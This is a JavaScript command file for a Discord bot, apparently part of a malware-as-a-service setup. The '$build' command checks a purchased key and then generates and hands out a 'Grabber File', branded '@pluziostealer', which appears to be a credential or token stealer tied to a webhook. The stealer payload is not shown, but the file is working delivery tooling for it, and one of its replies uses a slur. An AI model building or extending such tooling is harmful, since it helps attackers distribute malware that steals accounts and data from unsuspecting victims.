const Discord = require("discord.js");
const axios = require('axios')
var randomstring = require("randomstring");
const child_process = require('child_process');
require("moment-duration-format");
const fs = require('fs')
const AdmZip = require('adm-zip');
const { Build } = require('../builder.js')


const config = require('../config.json')


exports.run = async (client, message, args) => {
    const key = args[0], name = args[1]

    if (!args[0] || !args[1]) {
        message.channel.send("Invalid arguments! Use: $build <key> <name>")
    } else {
        axios.get(`${config.api_url}/check?key=${key}`).then(res => {
            if (res.data === '403: Invalid Key') { return message.reply('Key Is Invalid Gay!') } 

            message.channel.send("Creating Your File... (Can take more than 1 minute)")
            var start = +new Date();
            Build(key, name).then(response => {
                if (response.success == true) {
                    var end = + new Date(); var time = end - start;
                    const embed = new Discord.MessageEmbed()
                    .setColor('#303037')
                    .setAuthor('Grabber File', 'https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif')
                    .setDescription(`__Here's__ __your__ __file:__\n[\`Download\`](${response.link})`)
                    .setFooter(`@pluziostealer`)

                    message.channel.send({ content: `Done! (${time / 1000} s)`, embeds : [embed] });
                }
            })
        })
    }
};

exports.conf = { enabled: true, guildOnly: false, aliases: ["b","cg"], permLevel: 0 };

exports.help = { name: "build", description: "Update Key For Grabber", usage: "build <webhook>" };